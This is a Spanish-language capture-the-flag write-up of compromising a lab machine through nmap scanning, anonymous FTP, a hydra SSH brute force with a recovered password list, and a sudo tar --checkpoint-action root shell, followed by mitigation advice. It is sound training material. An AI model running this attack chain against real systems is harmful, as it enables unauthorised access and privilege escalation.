---
tags:
  - Nmap
  - hydra
  - ssh
  - FTP
  - sudo
  - tar
---



# Introduccion

Esta máquina fue comprometida combinando un reconocimiento clásico con abuso de servicios con configuraciones inseguras. El flujo general fue:

1. Reconocimiento con `nmap` para identificar servicios expuestos.
2. Acceso anónimo a FTP y descarga de archivos que contenían un posible usuario y una lista de contraseñas.
3. Fuerza bruta dirigida contra SSH usando `hydra` con el usuario descubierto y la lista de contraseñas.
4. Autenticación exitosa como `lin` vía SSH.
5. Revisión de privilegios (`sudo -l`) y explotación de `tar` con `--checkpoint-action` para obtener shell con UID 0.
En la sección que sigue describo paso a paso las acciones, evidencia (salidas de comandos) y explicaciones técnicas. Finalizo con recomendaciones de mitigación y lecciones aprendidas.

## Entorno y objetivos

- IP objetivo: `10.10.69.169`
- Objetivo del ejercicio: enumerar, obtener acceso (user) y escalar a `root`.
- Herramientas principales utilizadas: `nmap`, `ftp` cliente, `hydra`, `ssh`, `sudo`, `tar`.


# Reconocimiento — `nmap`

Se realizó un escaneo agresivo para descubrir servicios y versiones:

```bash
└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.10.69.169 -oN nmap.txt 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 09:52 CDT
Stats: 0:01:04 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 09:53 (0:00:03 remaining)                                 
Stats: 0:01:05 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan                            
Service scan Timing: About 100.00% done; ETC: 09:53 (0:00:00 remaining)                                
Stats: 0:01:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                             
NSE Timing: About 97.89% done; ETC: 09:53 (0:00:00 remaining)                                          
Nmap scan report for 10.10.69.169                                                                      
Host is up (0.16s latency).                                                                            
Not shown: 55529 filtered tcp ports (no-response), 10003 closed tcp ports (reset)                      
PORT   STATE SERVICE VERSION                                                                           
21/tcp open  ftp     vsftpd 3.0.5                                                                      
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.120.245
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2a:8c:39:b8:58:e7:74:5b:4d:ae:d4:2a:79:21:05:9c (RSA)
|   256 ca:2c:1e:a7:6f:48:41:75:91:44:9c:4c:b6:05:e2:35 (ECDSA)
|_  256 c8:d4:8c:ba:e1:88:e4:3a:b2:bc:31:6c:14:60:7f:ef (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Salida relevante:

```bash
21/tcp open ftp vsftpd 3.0.5
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open http Apache httpd 2.4.41
```

**Observaciones:**

- FTP permite login anónimo (esto fue confirmado más adelante).
- SSH y HTTP están abiertos, por lo que se puede intentar obtención de credenciales a través de información en servicios públicos (FTP) o fuerza bruta dirigida.



## Acceso a FTP anónimo y enumeración de archivos

Se intentó login anónimo con el cliente `ftp`:

```bash
─(zikuta㉿zikuta)-[~/Desktop/bountyhacker]
└─$ ftp 10.10.69.169 21 
Connected to 10.10.69.169.
220 (vsFTPd 3.0.5)
Name (10.10.69.169:zikuta): anonymous
230 Login successful.
```

Se listaron los archivos visibles y se descargaron los que eran accesibles:

```bash
ftp> ls
550 Permission denied.
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
```

### Contenido de `task.txt`

```bash
└─$ strings task.txt                   
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.
-lin
```

**Interpretación:** el archivo contiene una firma `-lin` que sugiere un nombre de usuario potencial — `lin`.


### Contenido de `locks.txt`

El archivo es una lista de cadenas que claramente parecen contraseñas o variaciones de una contraseña base (muchas combinaciones con mayúsculas, números y símbolos). Ejemplos:

```bash
$ strings locks.txt                               
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
            
```

**Interpretación:** tenemos una **lista de contraseñas** potenciales y un **usuario candidato** (`lin`). Esto permite lanzar una fuerza bruta dirigida contra servicios de autenticación.

## Ataque de fuerza bruta contra SSH con `hydra`

Se usó `hydra` para probar el usuario `lin` con el archivo `locks.txt` como diccionario:

```bash
hydra -l lin -P locks.txt ssh://10.10.69.169
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-16 10:33:56
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.69.169:22/
[22][ssh] host: 10.10.69.169   login: lin   password: RedDr4gonSynd1cat3      
```


**Notas:**

- El éxito se obtuvo por la combinación de un usuario correcto (`lin`) y una de las variantes de password presentes en `locks.txt`.
- En entornos reales, tenga en cuenta las limitaciones de intentos en SSH y políticas de bloqueo/alarma — aquí fue un laboratorio controlado.

## Acceso inicial — SSH

Con las credenciales encontradas se abrió sesión SSH:

```bash
lin@ip-10-10-69-169:~/Desktop$ ls
user.txt
```

## Enumeración local y chequeo de sudo

Comprobación de privilegios con `sudo -l`:

```bash
lin@ip-10-10-69-169:~/Desktop$ sudo -l 
[sudo] password for lin: 
Matching Defaults entries for lin on ip-10-10-69-169:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on ip-10-10-69-169:
    (root) /bin/tar
```

**Interpretación clave:** el usuario `lin` puede ejecutar `/bin/tar` **como root** sin necesidad de contraseña. Esto abre una vía de escalada porque `tar` tiene opciones que permiten ejecutar comandos arbitrarios en el contexto del proceso (con los privilegios del proceso padre cuando se ejecuta con `sudo`).
### Escalada de privilegios — abuso de `tar` (`--checkpoint-action`)


Se aprovechó la opción de `tar` `--checkpoint-action=exec` que permite ejecutar un comando en cada checkpoint. Al ejecutar `tar` con `sudo`, el comando se ejecuta con UID `0`.

```bash
lin@ip-10-10-69-169:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# id
uid=0(root) gid=0(root) groups=0(root)
```

Este comando lo que hace 

- `sudo`: ejecuta el comando siguiente con permisos de root.
- `tar`: el binario de GNU tar (el que se ejecuta con `sudo`).
- `-c`: crear un archivo (modo creación).
- `-f /dev/null`: escribir el archivo de salida en `/dev/null` (es decir, no crear nada persistente).
- `/dev/null`: es el archivo que `tar` incluye en el archivo (prácticamente nada).
- `--checkpoint=1`: le dice a `tar` que ejecute una "acción de checkpoint" después de procesar 1 entrada — es un mecanismo de tar para hacer acciones periódicas durante su ejecución.
- `--checkpoint-action=exec=/bin/sh`: **la parte clave** — le dice a `tar` que, en el checkpoint, ejecute el comando `/bin/sh`.

# ¿Por qué esto escala privilegios?

Si el usuario puede ejecutar `tar` con `sudo` (es decir, `sudo tar ...` está permitido en `/etc/sudoers`), entonces `tar` corre como root. La opción `--checkpoint-action=exec=...` permite a `tar` ejecutar arbitrariamente un comando (a menudo usando `system()` o similar) **pero con el UID efectivo del proceso de tar** — en este caso root. Por tanto, `tar` ejecuta `/bin/sh` como root, lo que te deja con una shell interactiva con UID 0 (root). En la práctica verás un `#` y `id` mostrará `uid=0(root)`.


## Recomendaciones de mitigación

1. **Eliminar el acceso** `**sudo**` **irrestricto a binarios capaces de ejecutar comandos arbitrarios.** En este caso, `lin` tenía permiso para ejecutar `/bin/tar` como root. Si realmente necesita ejecutar `tar` con privilegios, restrinja los argumentos permitidos o utilice mecanismos de elevación más seguros.
2. **Auditoría de usuarios con permisos** `**sudo**`**.** Revisar `/etc/sudoers` y los archivos en `/etc/sudoers.d/` para verificar que los derechos concedidos sean mínimos y justificados.
3. **Desactivar FTP anónimo si no es necesario.** El soporte de acceso anónimo a FTP permitió obtener información sensible solo por estar disponible públicamente.
4. **Políticas de contraseñas más fuertes y protección contra fuerza bruta.** Las listas de contraseñas presentes en FTP facilitaron el acceso. Implementar bloqueo por múltiples intentos fallidos en servicios de autenticación y usar autenticación multifactor cuando sea posible.
5. **Registro y monitorización.** Habilitar alertas para inicios de sesión por SSH desde IPs inusuales y uso de `sudo` por parte de usuarios no esperados.
6. **Principio de menor privilegio para servicios y cuentas de servicio.** Evitar dejar listas de contraseñas o notas con credenciales en ubicaciones accesibles públicamente.

## Conclusión

La máquina fue comprometida exitosamente mediante una cadena de fallos de configuración: información sensible (usuario y lista de contraseñas) disponible en FTP anónimo, seguido por fuerza bruta dirigida a SSH y una escalada de privilegios simple pero efectiva gracias a permisos sudo mal configurados para `/bin/tar`. La mitigación pasa por eliminar credenciales en servicios públicos, endurecer `sudoers` y aplicar controles de acceso y monitorización.